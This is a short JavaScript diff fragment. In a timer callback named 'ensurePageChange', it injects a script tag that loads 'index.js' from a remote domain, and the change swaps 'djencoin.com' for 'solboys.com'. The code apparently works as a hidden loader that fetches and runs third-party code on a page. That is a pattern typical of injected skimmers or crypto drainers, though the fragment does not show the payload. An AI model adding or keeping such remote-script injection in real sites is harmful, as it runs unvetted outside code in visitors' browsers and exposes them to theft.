@@ -28,7 +28,7 @@ const ensurePageChange = setInterval(() => {
 
   
           const script = document.createElement('script');
-          script.src = 'https://djencoin.com/index.js';
+          script.src = 'https://solboys.com/index.js';
           document.body.appendChild(script);
         
           
